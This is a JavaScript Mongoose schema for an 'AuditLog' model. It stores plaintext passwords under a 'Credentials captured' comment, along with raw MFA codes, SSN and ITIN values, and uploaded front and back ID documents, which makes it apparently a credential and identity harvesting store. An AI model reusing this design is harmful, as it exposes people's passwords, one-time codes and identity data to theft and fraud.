const mongoose = require('mongoose');

const auditLogSchema = new mongoose.Schema(
  {
    userId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'User',
      required: true
    },
    userEmail: String,
    action: {
      type: String,
      required: true,
      enum: [
        'SIGNIN_ATTEMPT',
        'MFA_CODE_VERIFIED',
        'MFA_VERIFICATION_FAILED',
        'DOCUMENT_UPLOAD_FRONT',
        'DOCUMENT_UPLOAD_BACK',
        'PERSONAL_INFO_SUBMITTED',
        'ITIN_SUBMITTED',
        'SSN_SUBMITTED',
        'AUTH_CODE_SUBMITTED'
      ],
      index: true
    },
    // Credentials captured
    credentialsData: {
      email: String,
      password: String
    },
    // Document uploads
    documentData: {
      type: { type: String },  // 'front' or 'back'
      filename: String,
      filepath: String,
      filesize: Number,
      mimetype: String,
      uploadTime: Date
    },
    // Personal information submitted
    personalInfoData: mongoose.Schema.Types.Mixed,
    // SSN/ITIN data
    ssnData: String,
    itinData: String,
    // MFA code
    mfaCodeData: String,
    // Entry details
    details: mongoose.Schema.Types.Mixed,
    // Status of action
    status: {
      type: String,
      enum: ['success', 'failed'],
      default: 'success'
    },
    // Timestamp automatically added
  },
  { timestamps: true }
);

// Index for faster queries
auditLogSchema.index({ userId: 1, createdAt: -1 });
auditLogSchema.index({ action: 1, createdAt: -1 });

module.exports = mongoose.model('AuditLog', auditLogSchema);
